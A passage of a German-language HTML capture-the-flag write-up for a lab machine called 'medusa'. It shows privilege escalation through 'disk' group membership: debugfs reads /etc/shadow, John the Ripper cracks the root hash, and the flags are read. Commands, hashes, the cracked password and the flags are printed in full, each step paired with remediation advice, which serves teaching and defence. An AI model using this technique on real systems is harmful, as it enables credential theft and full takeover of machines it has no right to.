+                      <pre>uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</pre>
+                      <div class="prompt">spectre@medusa:~$ <span class="command">df -h</span></div>
+                      <pre>
+Filesystem      Size  Used Avail Use% Mounted on
+udev            471M     0  471M   0% /dev
+tmpfs            98M  500K   98M   1% /run
+/dev/sda1       6.9G  3.9G  2.7G  60% /
+tmpfs           489M     0  489M   0% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs            98M     0   98M   0% /run/user/1000</pre>
+                 </div>
+             </div>
+
+            <!-- POC Abschnitt beginnt hier -->
+            <section id="poc">
+                <h2>Proof of Concept (Privilege Escalation zu Root via debugfs / Gruppe 'disk')</h2>
+                 <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `spectre` ist Mitglied der Gruppe `disk`. Diese Mitgliedschaft gewährt Lese- und Schreibzugriff auf Blockgeräte wie `/dev/sda1`. Das Tool `debugfs` kann verwendet werden, um direkt auf das Dateisystem auf dem Blockgerät zuzugreifen und Dateien zu lesen (oder zu schreiben), selbst wenn die normalen Dateisystemberechtigungen dies verhindern würden. Hier wird es genutzt, um die Datei `/etc/shadow` zu lesen, die die Passwort-Hashes enthält.</p>
+                 <p class="analysis"><strong>Voraussetzungen:</strong>
+                    <ul>
+                        <li>Shell-Zugriff als Benutzer `spectre`.</li>
+                        <li>Mitgliedschaft des Benutzers `spectre` in der Gruppe `disk`.</li>
+                        <li>Installiertes `debugfs`-Tool (Teil von `e2fsprogs`).</li>
+                        <li>Kenntnis des Gerätenamens der Root-Partition (hier `/dev/sda1`).</li>
+                    </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+                <p class="analysis"><strong>1. Zugriff auf das Dateisystem mit debugfs:</strong> Das Tool `debugfs` wird im Schreibmodus (`-w`) auf das Blockgerät `/dev/sda1` angewendet. Dies öffnet eine interaktive `debugfs`-Shell.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Der Start von `debugfs` ist erfolgreich, da `spectre` aufgrund der `disk`-Gruppenmitgliedschaft die nötigen Rechte für den Zugriff auf `/dev/sda1` hat.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den `cat`-Befehl innerhalb der `debugfs`-Shell, um den Inhalt von `/etc/shadow` auszulesen.
+                <br><strong>Empfehlung (Admin):</strong> Entziehen Sie dem Benutzer `spectre` die Mitgliedschaft in der Gruppe `disk`. Beschränken Sie den direkten Zugriff auf Blockgeräte.</p>
+                 <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt">spectre@medusa:~$ <span class="command">/sbin/debugfs -w /dev/sda1</span></div>
+                         <pre>debugfs 1.46.2 (28-Feb-2021)</pre>
+                     </div>
+                 </div>
+
+                <p class="analysis"><strong>2. Auslesen der /etc/shadow-Datei:</strong> Innerhalb der `debugfs`-Shell wird der Befehl `cat /etc/shadow` verwendet, um den Inhalt der Shadow-Datei direkt vom Dateisystem zu lesen.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Der Befehl ist erfolgreich und gibt den Inhalt von `/etc/shadow` aus, einschließlich der Passwort-Hashes für `root` und `spectre`. Der Hash für `root` lautet `$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2`. Das Format `$y$` deutet auf `yescrypt` hin, einen modernen und sicheren Hashing-Algorithmus.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie den Hash für den `root`-Benutzer und versuchen Sie, ihn offline mit Tools wie John the Ripper oder Hashcat zu knacken.
+                <br><strong>Empfehlung (Admin):</strong> Beheben Sie die zugrundeliegende Schwachstelle (Gruppenmitgliedschaft `disk`). Verwenden Sie starke, einzigartige Passwörter für alle Konten, insbesondere `root`.</p>
+                 <div class="code-block">
+                     <div class="terminal">
+                         <!-- Prompt von debugfs übernommen -->
+                         <div class="prompt">debugfs:  <span class="command">cat /etc/shadow</span></div>
+                         <pre>
+root:<span class="password">$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2</span>:19375:0:99999:7:::
+spectre:<span class="password">$y$j9T$hJ2NDuuh.Fcra9rgSvEFg1$xyqMDqtseDklRQDljPN./FKy./QfXfG78t2ndXBVKi8</span>:19452:0:99999:7:::</pre> <!-- Restliche Shadow-Einträge nicht im Text -->
+                     </div>
+                 </div>
+                  <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Die Mitgliedschaft in der Gruppe `disk` in Kombination mit Tools wie `debugfs` ermöglicht das Auslesen sensibler Systemdateien wie `/etc/shadow`. Das Knacken des Root-Passwort-Hashes führt zur vollständigen Kompromittierung des Systems.</p>
+                  <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                    <ol>
+                        <li>Entfernen Sie den Benutzer `spectre` (und alle anderen nicht-privilegierten Benutzer) aus der Gruppe `disk`.</li>
+                        <li>Stellen Sie sicher, dass die Berechtigungen für Blockgeräte (`/dev/sd*`, `/dev/nvme*` etc.) restriktiv sind (normalerweise `root:disk` mit `brw-rw----` Rechten).</li>
+                        <li>Erzwingen Sie starke Passwörter für alle Benutzer, insbesondere für `root`.</li>
+                        <li>Überwachen Sie Gruppenmitgliedschaften und Berechtigungen regelmäßig.</li>
+                    </ol>
+                 </p>
+            </section> <!-- POC Abschnitt endet hier -->
+
+            <p class="analysis"><strong>Analyse:</strong> Der aus `/etc/shadow` extrahierte Hash für den `root`-Benutzer wird in eine Datei namens `root` gespeichert (vermutlich mittels `vi` oder `echo`). Anschließend wird John the Ripper verwendet, um diesen Hash mit der `rockyou.txt`-Wortliste und dem expliziten Format `--format=crypt` (Oberbegriff für verschiedene Unix-Crypt-Hashes, John erkennt yescrypt darunter) zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> John the Ripper ist erfolgreich und findet das Klartextpasswort für den `root`-Benutzer: `<span class="password">andromeda</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie das gefundene Passwort, um sich mit `su root` als Root-Benutzer anzumelden.
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie das Root-Passwort sofort in ein starkes, einzigartiges Passwort. Beheben Sie die Schwachstelle, die das Auslesen des Hashes ermöglicht hat (Gruppe `disk`). Verwenden Sie keine Wörterbuchwörter als Passwörter.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi root</span></div>
+                       <!-- Inhalt der Datei 'root' -->
+                       <pre>echo "root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::"</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt root --format=crypt</span></div>
+                      <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (crypt, generic crypt(3) [?/64])
+Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
+Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
+Will run 12 penMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+<span class="password">andromeda</span>        (root)
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+1g 0:00:00:06 DNE (2023-04-05 02:17) 0.1490g/s 572.2p/s 572.2c/s 572.2C/s badboys..nelly1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit dem geknackten Passwort (`andromeda`) wird der Befehl `su root` ausgeführt, um vom Benutzer `spectre` zum Benutzer `root` zu wechseln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Wechsel ist erfolgreich! Der Prompt ändert sich zu `root@medusa:/home/spectre#`, und der Befehl `id` bestätigt `uid=0(root) gid=0(root)`. Volle Root-Rechte wurden erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Privilege Escalation abgeschlossen. Lesen Sie die Root-Flag und führen Sie eventuelle Aufräumarbeiten durch.
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie das Root-Passwort und beheben Sie die zugrundeliegenden Schwachstellen (Gruppe `disk`).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">spectre@medusa:~$ <span class="command">su root</span></div>
+                      <pre>Password: <span class="password">andromeda</span></pre>
+                      <div class="prompt">root@medusa:/home/spectre# <span class="command">id</span></div>
+                      <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                      <div class="prompt">root@medusa:/home/spectre# </div>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Root-Benutzer werden die User- und Root-Flags aus den entsprechenden Dateien gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Beide Flags werden erfolgreich ausgelesen:
+            *   User-Flag (`/home/spectre/user.txt`): `<span class="password">487a5d1ce02c53fbf60c3abd300d9ff5</span>`
+            *   Root-Flag (`.r0t.txt` - vermutlich in `/root/`): `<span class="password">34b1e6fc5e7fe0bfd56ed4b8776c9f5b</span>`
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Dokumentieren Sie die Flags und den Weg dorthin.
+            <br><strong>Empfehlung (Admin):</strong> Die Flags sind Teil der CTF-Challenge. In einer realen Umgebung sollten die zugrundeliegenden Schwachstellen behoben werden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">root@medusa:/home/spectre# <span class="command">cat /home/spectre/user.txt</span></div>
+                      <pre>
+good job!
+
+<span class="password">487a5d1ce02c53fbf60c3abd300d9ff5</span></pre>
+                      <div class="prompt">root@medusa:/home/spectre# <span class="command">cat /root/.r0t.txt</span></div> <!-- Annahme: Befehl für die Root-Flag -->
+                      <pre>
+congrats hacker :)
+
+<span class="password">34b1e6fc5e7fe0bfd56ed4b8776c9f5b</span></pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/spectre/user.txt</div>
+                     <div class="flag-value"><span class="password">487a5d1ce02c53fbf60c3abd300d9ff5</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <!-- Annahme: Pfad zur Root-Flag basierend auf dem cat-Befehl oben -->
+                     <div class="flag-command">cat /root/.r0t.txt</div>
+                     <div class="flag-value"><span class="password">34b1e6fc5e7fe0bfd56ed4b8776c9f5b</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-04-05</p>
+    </footer>
+</body>
+</html>
